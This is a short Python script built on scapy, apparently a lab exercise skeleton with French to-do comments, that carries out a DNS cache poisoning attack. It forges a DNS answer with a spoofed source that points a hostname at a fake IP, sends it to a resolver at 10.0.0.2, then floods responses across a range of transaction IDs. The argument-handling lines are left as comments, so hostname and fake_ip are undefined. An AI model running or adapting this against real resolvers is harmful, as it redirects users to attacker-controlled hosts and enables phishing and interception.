# Author: @zartax0o3
# Date: 2023-31-01
# Description: This script is used to perform a DNS cache poisoning attack. 
# It sends a DNS response to the cache server with the spoofed IP address. 
# It also sends a DNS request to the cache server to make sure that the cache server will cache the response. 
#Finally, it sends a bunch of DNS requests with different IDs to the cache server to make sure that the cache server will cache the response.

from scapy.all import *

# Ajouter une condition vérifiant qu'au lancement du script trois paramètre soient bien utilisé (La commmande plus deux arguments : Le domaine et l'IP)
# Si cette condition n'est pas rempli alors on exit le programme et on print une erreur.

# Ici on place le second argument (index 1) dans une variable nommé hostname

# Ici on place le dernier argument (index 2) dans une variable nommé fake_ip

cache_server_ip = "10.0.0.2"

cache_server_port = 22222

i = IP(dst=cache_server_ip, src="10.0.0.5")
u = UDP(dport=cache_server_port, sport=53)
d = DNS(id=0, qr=1, qd=DNSQR(qname=hostname), qdcount=1, ancount=1, nscount=0, arcount=0, an=(DNSRR(rrname=DNSQR(qname=hostname).qname, type='A', ttl=3600, rdata=fake_ip)))


response = i / u / d

request = IP(dst=cache_server_ip) / UDP(dport=53) / DNS(id=500, qr=0, rd=1, qdcount=1, qd=DNSQR(qname=hostname, qtype="A", qclass="IN"))

send(response, verbose=0)
send(request, verbose=0)

for x in range(10000, 10050):
    response[DNS].id = x
    send(response, verbose=0)
